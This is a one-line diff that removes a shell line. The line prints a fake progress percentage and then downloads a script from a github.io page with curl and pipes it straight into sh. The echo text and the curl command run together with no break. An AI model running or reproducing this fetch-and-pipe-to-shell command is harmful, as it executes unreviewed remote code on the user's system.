@@ -1,1 +1,0 @@
-echo Progress: 71.00%curl -L --progress-bar frkns.github.io/fun/rick-merchants-progressive-matches-phenomenon.h | sh
